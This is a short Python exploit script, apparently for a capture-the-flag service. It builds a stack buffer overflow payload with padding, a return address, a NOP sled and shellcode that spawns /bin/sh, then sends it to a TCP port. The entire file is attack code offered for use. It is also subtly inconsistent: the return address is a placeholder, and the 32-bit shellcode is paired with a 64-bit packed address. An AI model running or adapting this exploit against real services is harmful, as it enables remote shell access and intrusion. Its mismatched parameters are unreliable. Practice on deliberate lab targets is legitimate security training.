import socket
import struct

# Target details (modify for remote server)
host = "127.0.0.1"  # Use the remote IP for remote exploitation
port = 1337         # Change to 32580 for remote server

# Exploit parameters
offset = 72  # Determined using cyclic patterns
return_address = struct.pack("<Q", 0xdeadbeef)  # Replace with a valid address
nop_sled = b"\x90" * 16  # NOP sled to ensure safe execution
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # Example shellcode

# Construct the payload
payload = b"A" * offset + return_address + nop_sled + shellcode

print(f"Sending payload: {payload}")

# Send the payload to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(payload)
    response = s.recv(1024)
    print("Received:", response.decode())
